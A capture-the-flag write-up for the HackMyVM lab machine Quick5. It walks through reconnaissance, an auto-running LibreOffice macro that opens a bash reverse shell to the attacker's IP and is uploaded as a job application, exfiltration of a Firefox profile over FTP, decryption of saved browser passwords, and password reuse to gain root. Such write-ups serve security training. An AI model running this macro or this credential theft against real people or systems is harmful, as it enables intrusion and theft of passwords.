---
title: Write-up Quick5 on HackMyVM
author: eMVee
date: 2024-03-27 00:00:00 +0000
categories: [CTF, HackMyVM]
tags: [HackMyVM, OSCP, PNPT, client-side, client, macro, office, libreoffice, credentials browser, password]
render_with_liquid: false
---


Let's dive into the Quick5 vulnerable machine hosted on HackMyVM. This machine offers valuable lessons in ethical hacking and penetration testing, with a focus on client side attacks such as exploiting documents with macros and privilege escalation via stored passwords in a browser.

The journey begins with identifying all functionalities on the website and technologies used and mentioned on the website. After enumerating all available information the attack paths should be clear and a malicious macro should be crafted an uploaded. Using this vulnerability, we'll gain an initial foothold as the 'recruiter' who reads the files uploaded by applying to a job.

Privilege escalation follows, first by enumerating all files in the home directory of the user. In this part we are able to find the location of the stored credentials from the browser. By decrypting the credentials we can reuse the password and gain more privileges on the system.

Join us as we explore these techniques and learn how to enhance our ethical hacking skills while navigating the Quick5 vulnerable machine from HackMyVM.
## Enumeration

After creating a project directory we should identify the IP address of the target. We can do this by running a ping sweep with fping. To make our life easier we can assign the IP address to a variable in the terminal.
```bash
┌──(emvee㉿kali)-[~/Documents/Quick5]
└─$ fping -ag 10.0.2.0/24 2> /dev/null 
10.0.2.1
10.0.2.2
10.0.2.3
10.0.2.15
10.0.2.48

┌──(emvee㉿kali)-[~/Documents/Quick5]
└─$ ip=10.0.2.48  
```
Now we should start a port scan to identify open ports and running services.
```
┌──(emvee㉿kali)-[~/Documents/Quick5]
└─$ sudo nmap -sC -sV -T4 -A -O -p- $ip
[sudo] password for emvee: 
Starting Nmap 7.94 ( https://nmap.org ) at 2024-02-15 09:51 CET
Nmap scan report for quick.hmv (10.0.2.48)
Host is up (0.0011s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 84:e8:9c:b0:23:44:41:29:ae:7d:0b:0f:fe:88:08:c0 (ECDSA)
|_  256 44:82:b7:78:47:02:7e:b4:40:c7:6b:fd:70:68:c1:42 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Quick Automative - Home
MAC Address: 08:00:27:02:60:6D (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


TRACEROUTE
HOP RTT     ADDRESS
1   1.02 ms quick.hmv (10.0.2.48)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.97 seconds
```

We discovered two open port, let's add some information to our notes.
- Linux, probably an Ubuntu
- Port 22
	- SSH
	- OpenSSH 8.9p1
- Port 80
	- HTTP
	- Title: Automative - Home
	- Apache 2.4.52

![image](/assets/img/WriteUp/HackMyVM/Quick5/Pasted image 20240319190313.png){: width="700" height="400" }


There are several items interesting on the website such as:
- About
- Services
- Team
- Careers
- Contact
- Make appointment

 The button `Make appointment` is one of the most interesting on the website.
 ![image](/assets/img/WriteUp/HackMyVM/Quick5/Pasted image 20240319190653.png){: width="700" height="400" }


 When we visit the page we get a message that the site will be back soon due to maintenance and a hack. Since we cannot do anything here we should go back to enumerate other pages. 

Since they did experience a hack in the past, they probably need some employees working on this. Let's visit the career page to see what we can discover.

![image](/assets/img/WriteUp/HackMyVM/Quick5/Pasted image 20240215102225.png){: width="700" height="400" }


They have three vacancies open:
- Security engineer
- Developer
- Sales person

Let's check the job descriptions one by one.

![image](/assets/img/WriteUp/HackMyVM/Quick5/Pasted image 20240215103747.png){: width="700" height="400" }


In the job description for the 'Security engineer' we could only discover an email address and a link to `apply.php`. We should add the email address to our notes.
- protector@quick.hmv

Let's check the job description for the developer vacancy.
![image](/assets/img/WriteUp/HackMyVM/Quick5/Pasted image 20240319191251.png){: width="700" height="400" }

This job description does tell us something more about the technologies used in the company and an email address. Let's add them to our notes:
- PHP
- Python
- LibreOffice
- Linux (servers)
- codewizard@quick.hmv

To make sure we don't miss anything we should check the job description for the 'Sales person' as well.

![image](/assets/img/WriteUp/HackMyVM/Quick5/Pasted image 20240319191847.png){: width="700" height="400" }


Another email address is found. We should add this one to our notes as well.
- wheeldealwhiz@quick.hmv

Let's now check the `apply.php` page.

![image](/assets/img/WriteUp/HackMyVM/Quick5/Pasted image 20240215103847.png){: width="700" height="400" }


To apply to a job we can upload a motivation letter and a resume. The file extension we can choose of are `.odt` and `.pdf`. In the job description for developer LibreOffice was mentioned. We can create a malicious macro that create a reverse shell back to our machine.

We should open LibreOffice Writer and start writing our malicious macro. We can follow the following steps:
1. Create a new file in LibreOffice Writer
2. Save the file as `filename.odt`
3. Go to `Tools` > `Macros` > `Organize Macros` > `Basic`
4. Select `document`
5. Click on the `New` button
6. Give the Macro a name

We can give the file any name we want and type anything we want into the document. But to convince any one we should give the file a proper name and content that looks like real.

The reverse shell macro we can use looks like this:
```
REM  *****  BASIC  *****
Sub on_open(oEvent As Object)

    Call Main

End Sub

Sub Main
	
	Shell("bash -c 'bash -i >& /dev/tcp/10.0.2.15/443 0>&1'")
    
End Sub
```


![image](/assets/img/WriteUp/HackMyVM/Quick5/Pasted image 20240215103102.png){: width="700" height="400" }


After saving the file we should configure the document so it runs the macro when the document is opened by someone. To enable the the autorun the following steps should be performed
1. Click on `Tools` > `Customize` > `Events`
2. Click on `Open Document`
3. Click under `Assign` the button `Macro`
4. Choose the macro name `on_open` by selecting the macro via the library.
5. Click on the `OK` button
6. Save the document and close it
7. When opening the document the macro will be executed.

![image](/assets/img/WriteUp/HackMyVM/Quick5/Pasted image 20240215103147.png){: width="700" height="400" }


Now save the file again and close the file. Next we should upload the file with any first name and last name we want. If this was a real scenario we should use a name that does exist instead of typing `qq` and `dd`.

![image](/assets/img/WriteUp/HackMyVM/Quick5/Pasted image 20240215103921.png){: width="700" height="400" }


After uploading the malicious documents we should start our netcat listener to catch our reverse shell.
```bash
┌──(emvee㉿kali)-[~/Documents/Quick5]
└─$ sudo nc -lvp 443
listening on [any] 443 ...
```

## Initial access
After a waiting a bit we get an incoming connection.
```bash
┌──(emvee㉿kali)-[~/Documents/Quick5]
└─$ sudo nc -lvp 443
listening on [any] 443 ...
connect to [10.0.2.15] from quick.hmv [10.0.2.48] 45510
bash: cannot set terminal process group (1540): Inappropriate ioctl for device
bash: no job control in this shell
andrew@quick5:~/applicants$ 
```
It looks like we are Andrew on Quick5. One of the first steps in local enumeration (on a target) is to see what interesting files are available for us. We should first check what files are available in the home directory before we search through any other directory.

```bash
andrew@quick5:~/applicants$ cd ..
cd ..
andrew@quick5:~$ ls -la
andrew@quick5:~$ ls -la
ls -la
total 136
drwxr-x--- 16 andrew andrew  4096 Mar  1 16:21 .
drwxr-xr-x  3 root   root    4096 Feb 20 11:56 ..
drwxrwxr-x  2 andrew andrew  4096 Feb 20 12:54 applicants
lrwxrwxrwx  1 andrew andrew     9 Feb 20 13:12 .bash_history -> /dev/null
-rw-r--r--  1 andrew andrew   220 Jan  6  2022 .bash_logout
-rw-r--r--  1 andrew andrew  3771 Jan  6  2022 .bashrc
drwx------ 13 andrew andrew  4096 Feb 20 12:27 .cache
drwx------ 12 andrew andrew  4096 Feb 20 12:58 .config
drwxr-xr-x  2 andrew andrew  4096 Feb 20 12:14 Desktop
drwxr-xr-x  2 andrew andrew  4096 Feb 20 12:14 Documents
drwxr-xr-x  2 andrew andrew  4096 Feb 20 12:50 Downloads
drwx------  3 andrew andrew  4096 Feb 20 12:14 .local
drwxr-xr-x  2 andrew andrew  4096 Feb 20 12:14 Music
drwxr-xr-x  2 andrew andrew  4096 Feb 20 12:14 Pictures
-rw-r--r--  1 andrew andrew   807 Jan  6  2022 .profile
drwxr-xr-x  2 andrew andrew  4096 Feb 20 12:14 Public
-rw-rw-r--  1 andrew andrew    66 Feb 20 12:26 .selected_editor
drwx------  3 andrew andrew  4096 Feb 20 15:07 snap
drwx------  2 andrew andrew  4096 Feb 20 11:56 .ssh
-rw-r--r--  1 andrew andrew     0 Feb 20 11:58 .sudo_as_admin_successful
drwxr-xr-x  2 andrew andrew  4096 Feb 20 12:14 Templates
-rw-r-----  1 andrew andrew  5751 Feb 20 12:25 user.txt
-rw-r-----  1 andrew andrew     5 Mar  1 16:20 .vboxclient-clipboard-tty2-control.pid
-rw-r-----  1 andrew andrew     5 Mar  1 16:20 .vboxclient-clipboard-tty2-service.pid
-rw-r-----  1 andrew andrew     5 Mar  1 16:20 .vboxclient-draganddrop-tty2-control.pid
-rw-r-----  1 andrew andrew     5 Mar  1 16:20 .vboxclient-draganddrop-tty2-service.pid
-rw-r-----  1 andrew andrew     5 Mar  1 16:20 .vboxclient-hostversion-tty2-control.pid
-rw-r-----  1 andrew andrew     5 Mar  1 16:20 .vboxclient-seamless-tty2-control.pid
-rw-r-----  1 andrew andrew     5 Mar  1 16:20 .vboxclient-seamless-tty2-service.pid
-rw-r-----  1 andrew andrew     5 Mar  1 16:20 .vboxclient-vmsvga-session-tty2-control.pid
-rw-r-----  1 andrew andrew     5 Mar  1 16:20 .vboxclient-vmsvga-session-tty2-service.pid
drwxr-xr-x  2 andrew andrew  4096 Feb 20 12:14 Videos


```

The user flag is found in the home directory of Andrew. We should capture the flag and continue enumerating.

![image](/assets/img/WriteUp/HackMyVM/Quick5/Pasted image 20240215102653.png){: width="700" height="400" }


Since this is a workstation (yes something different as a server), we should look for files that might contain passwords. One of the files we should look for is `logins.json`. This is used to store credentials in a browser. In this case for Firefox. Depending on the operating system the location might be different. We should search for this file.
```bash
andrew@quick5:~$ find / -type f -name logins.json 2> /dev/null
find / -type f -name logins.json 2> /dev/null
/home/andrew/snap/firefox/common/.mozilla/firefox/ii990jpt.default/logins.json
andrew@quick5:~$ cd /home/andrew/snap/
cd /home/andrew/snap/
```
We have found the location of the file. Now we should create an archive of the Firefox folder. This will help us submitting the file to our machine so we can decrypt the credentials.
```bash
andrew@quick5:~/snap$ tar -czvf firefox.tar.gz firefox
tar -czvf firefox.tar.gz firefox
firefox/
firefox/3779/
firefox/3779/.local/
firefox/3779/.local/share/
firefox/3779/.local/share/glib-2.0/
firefox/3779/.local/share/glib-2.0/schemas/
firefox/3779/.local/share/themes
firefox/3779/.local/share/icons/
firefox/3779/.last_revision
firefox/3779/.config/
firefox/3779/.config/gtk-3.0/
firefox/3779/.config/gtk-3.0/gtk.css
firefox/3779/.config/gtk-3.0/settings.ini
firefox/3779/.config/gtk-3.0/bookmarks
firefox/3779/.config/ibus/
firefox/3779/.config/ibus/bus
firefox/3779/.config/user-dirs.locale
firefox/3779/.config/user-dirs.dirs.md5sum
firefox/3779/.config/user-dirs.dirs
firefox/3779/.config/dconf/
firefox/3779/.config/dconf/user
firefox/3779/.config/user-dirs.locale.md5sum
firefox/3779/.config/gtk-2.0/
firefox/3779/.config/gtk-2.0/gtkfilechooser.ini
firefox/3779/.config/fontconfig/
firefox/3779/.config/fontconfig/fonts.conf
firefox/3779/.themes
firefox/current
firefox/common/
firefox/common/.mozilla/
firefox/common/.mozilla/extensions/
firefox/common/.mozilla/firefox/

< ------ SNIP ------ >
```
Let's check if  the archive have been created.
```bash
andrew@quick5:~/snap$ ls -la
ls -la
total 38252
drwx------  3 andrew andrew     4096 Feb 20 15:07 .
drwxr-x--- 16 andrew andrew     4096 Feb 20 14:22 ..
drwxr-xr-x  4 andrew andrew     4096 Feb 20 12:26 firefox
-rw-rw-r--  1 andrew andrew 39157491 Feb 20 15:07 firefox.tar.gz
```
The archive have been created, now we have to exfiltrate it. We can start a Python FTP server so we can upload files to our machine.

```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Quick5]
└─$ sudo python -m pyftpdlib -i 10.0.2.15 -p 21 -w
[sudo] password for emvee: 
/usr/local/lib/python3.11/dist-packages/pyftpdlib/authorizers.py:108: RuntimeWarning: write permissions assigned to anonymous user.
  self._check_permissions(username, perm)
[I 2024-02-20 22:01:39] concurrency model: async
[I 2024-02-20 22:01:39] masquerade (NAT) address: None
[I 2024-02-20 22:01:39] passive ports: None
[I 2024-02-20 22:01:39] >>> starting FTP server on 10.0.2.15:21, pid=11500 <<<

```
Next we have to logon as anonymous and upload the archive.

```bash
andrew@quick5:~/snap$ ftp 10.0.2.15
ftp 10.0.2.15
anonymous
Password: a
Name (10.0.2.15:andrew): help
Commands may be abbreviated.  Commands are:

!               epsv6           mget            preserve        sendport
$               exit            mkdir           progress        set
account         features        mls             prompt          site
append          fget            mlsd            proxy           size
ascii           form            mlst            put             sndbuf
bell            ftp             mode            pwd             status
binary          gate            modtime         quit            struct
bye             get             more            quote           sunique
case            glob            mput            rate            system
cd              hash            mreget          rcvbuf          tenex
cdup            help            msend           recv            throttle
chmod           idle            newer           reget           trace
close           image           nlist           remopts         type
cr              lcd             nmap            rename          umask
debug           less            ntrans          reset           unset
delete          lpage           open            restart         usage
dir             lpwd            page            rhelp           user
disconnect      ls              passive         rmdir           verbose
edit            macdef          pdir            rstatus         xferbuf
epsv            mdelete         pls             runique         ?
epsv4           mdir            pmlsd           send
put firefox.tar.gz
exit

```
After closing the connection with the FTP server we should check on our machine if the file have been received.

```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Quick5]
└─$ ll
total 38240
-rw-r--r-- 1 emvee emvee 39157491 Feb 20 16:09 firefox.tar.gz
```
We did receive the file, now we should extract the file and change the working directory to the location where we have the file `logins.json` .

```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Quick5]
└─$ tar -xzf firefox.tar.gz

┌──(emvee㉿kali)-[~/Documents/HMV/Quick5]
└─$ ls -la                    
total 38252
drwxr-xr-x  3 emvee emvee     4096 Feb 20 16:12 .
drwxr-xr-x 25 emvee emvee     4096 Feb 19 22:33 ..
drwxr-xr-x  4 emvee emvee     4096 Feb 20 13:26 firefox
-rw-r--r--  1 emvee emvee 39157491 Feb 20 16:09 firefox.tar.gz

┌──(emvee㉿kali)-[~/Documents/HMV/Quick5]
└─$ cd firefox  

┌──(emvee㉿kali)-[~/Documents/HMV/Quick5/firefox]
└─$ ls -la
total 16
drwxr-xr-x 4 emvee emvee 4096 Feb 20 13:26 .
drwxr-xr-x 3 emvee emvee 4096 Feb 20 16:12 ..
drwxr-xr-x 4 emvee emvee 4096 Feb 20 13:26 3779
drwxr-xr-x 4 emvee emvee 4096 Feb 20 13:26 common
lrwxrwxrwx 1 emvee emvee    4 Feb 20 13:26 current -> 3779

┌──(emvee㉿kali)-[~/Documents/HMV/Quick5/firefox]
└─$ cd common    

┌──(emvee㉿kali)-[~/…/HMV/Quick5/firefox/common]
└─$ ls -la
total 16
drwxr-xr-x 4 emvee emvee 4096 Feb 20 13:26 .
drwxr-xr-x 4 emvee emvee 4096 Feb 20 13:26 ..
drwxr-xr-x 7 emvee emvee 4096 Feb 20 13:26 .cache
drwx------ 4 emvee emvee 4096 Feb 20 13:26 .mozilla

┌──(emvee㉿kali)-[~/…/HMV/Quick5/firefox/common]
└─$ cd .mozilla/firefox/ii990jpt.default 

┌──(emvee㉿kali)-[~/…/common/.mozilla/firefox/ii990jpt.default]
└─$ ll    
total 12252
-rw-r--r-- 1 emvee emvee    1112 Feb 20 13:27 addons.json
-rw-r--r-- 1 emvee emvee    5946 Feb 20 15:19 addonStartup.json.lz4
-rw-r--r-- 1 emvee emvee   20576 Feb 20 15:21 AlternateServices.bin
drwxr-xr-x 2 emvee emvee    4096 Feb 20 13:26 bookmarkbackups
-rw-r--r-- 1 emvee emvee     221 Feb 20 15:19 broadcast-listeners.json
-rw------- 1 emvee emvee  229376 Feb 20 13:27 cert9.db
-rw------- 1 emvee emvee     199 Feb 20 13:26 compatibility.ini
-rw-r--r-- 1 emvee emvee     688 Feb 20 13:26 containers.json
-rw-r--r-- 1 emvee emvee  262144 Feb 20 15:20 content-prefs.sqlite
-rw-r--r-- 1 emvee emvee  524288 Feb 20 15:21 cookies.sqlite
-rw-r--r-- 1 emvee emvee       0 Feb 20 15:21 cookies.sqlite-wal
drwx------ 3 emvee emvee    4096 Feb 20 15:21 crashes
drwxr-xr-x 4 emvee emvee    4096 Feb 20 15:21 datareporting
-rw-r--r-- 1 emvee emvee    9432 Feb 20 13:26 ExperimentStoreData.json
-rw-r--r-- 1 emvee emvee    1179 Feb 20 13:26 extension-preferences.json
drwxr-xr-x 2 emvee emvee    4096 Feb 20 13:26 extensions
-rw-r--r-- 1 emvee emvee   44267 Feb 20 13:27 extensions.json
drwxr-xr-x 2 emvee emvee    4096 Feb 20 13:26 extension-store
-rw-r--r-- 1 emvee emvee 5242880 Feb 20 15:21 favicons.sqlite
-rw-r--r-- 1 emvee emvee       0 Feb 20 15:21 favicons.sqlite-wal
-rw-r--r-- 1 emvee emvee  262144 Feb 20 15:21 formhistory.sqlite
drwxr-xr-x 3 emvee emvee    4096 Feb 20 13:27 gmp-gmpopenh264
-rw-r--r-- 1 emvee emvee     380 Feb 20 13:26 handlers.json
-rw------- 1 emvee emvee  294912 Feb 20 13:27 key4.db
lrwxrwxrwx 1 emvee emvee      15 Feb 20 15:20 lock -> 127.0.1.1:+4127
-rw-r--r-- 1 emvee emvee     763 Feb 20 13:27 logins.json
drwx------ 2 emvee emvee    4096 Feb 20 13:26 minidumps
-rw-r--r-- 1 emvee emvee   98304 Feb 20 15:21 permissions.sqlite
-rw------- 1 emvee emvee     490 Feb 20 13:26 pkcs11.txt
-rw-r--r-- 1 emvee emvee 5242880 Feb 20 15:21 places.sqlite
-rw-r--r-- 1 emvee emvee       0 Feb 20 15:21 places.sqlite-wal
-rw------- 1 emvee emvee   15258 Feb 20 15:21 prefs.js
-rw-r--r-- 1 emvee emvee   65536 Feb 20 15:21 protections.sqlite
drwx------ 2 emvee emvee    4096 Feb 20 15:21 saved-telemetry-pings
-rw-r--r-- 1 emvee emvee     388 Feb 20 13:29 search.json.mozlz4
drwxr-xr-x 2 emvee emvee    4096 Feb 20 13:29 security_state
-rw-r--r-- 1 emvee emvee     288 Feb 20 15:21 sessionCheckpoints.json
drwxr-xr-x 2 emvee emvee    4096 Feb 20 15:21 sessionstore-backups
-rw-r--r-- 1 emvee emvee    7790 Feb 20 15:21 sessionstore.jsonlz4
drwxr-xr-x 2 emvee emvee    4096 Feb 20 15:19 settings
-rw-r--r-- 1 emvee emvee      18 Feb 20 13:26 shield-preference-experiments.json
-rw-r--r-- 1 emvee emvee    3432 Feb 20 15:21 SiteSecurityServiceState.bin
drwxr-xr-x 5 emvee emvee    4096 Feb 20 13:26 storage
-rw-r--r-- 1 emvee emvee    4096 Feb 20 15:21 storage.sqlite
-rwx------ 1 emvee emvee      50 Feb 20 13:26 times.json
-rw-r--r-- 1 emvee emvee   98304 Feb 20 13:27 webappsstore.sqlite
-rw-r--r-- 1 emvee emvee       0 Feb 20 13:27 webappsstore.sqlite-wal
-rw-r--r-- 1 emvee emvee     140 Feb 20 15:21 xulstore.json
```
Since we got all data from Firefox on our attacker machine, we can now decrypt stored credentials from the browser. 

```bash
┌──(emvee㉿kali)-[~/…/common/.mozilla/firefox/ii990jpt.default]
└─$ find . -name 'logins.json' -exec jq '.logins[] | .hostname, .encryptedUsername, .encryptedPassword' -r {} \; | pwdecrypt -d .
http://employee.quick.hmv
Decrypted: "andrew.speed@quick.hmv"
Decrypted: "SuperSecretPassword"

```

## Privilege escalation
Since we have now a password for the user Andrew we should try to reuse it or spray it on the system. In this case we should first try the password with the root user. 
```bash
andrew@quick5:~$ su root
su root
Password: SuperSecretPassword
id
uid=0(root) gid=0(root) groups=0(root)
cd ~
pwd
/root
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,DYNAMIC,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:7a:01:4c brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.49/24 brd 10.0.2.255 scope global dynamic enp0s3
       valid_lft 359sec preferred_lft 359sec
    inet6 fe80::a00:27ff:fe7a:14c/64 scope link 
       valid_lft forever preferred_lft forever
hostname
quick5
ls
root.txt

```

Just one more step we have to do, capturing the root flag!

![image](/assets/img/WriteUp/HackMyVM/Quick5/Pasted image 20240215102336.png){: width="700" height="400" }


## Conclusion

We began by examining the website's functionalities and technologies, then crafted and uploaded a malicious macro to exploit the vulnerability. This allowed us to gain an initial foothold as the 'recruiter' user.

Privilege escalation followed, starting with enumerating files in the user's home directory and discovering the stored credentials in the browser. By decrypting the credentials, we were able to reuse the password and elevate our privileges on the system.

Throughout this process, we learned about various attack techniques and gained hands-on experience in ethical hacking. This adventure has not only sharpened our skills but also highlighted the importance of maintaining secure systems and the potential risks associated with client-side attacks and stored passwords.

We hope you enjoyed this journey as much as we did and encourage you to continue learning and practicing ethical hacking techniques to improve your skills and contribute to a safer digital world.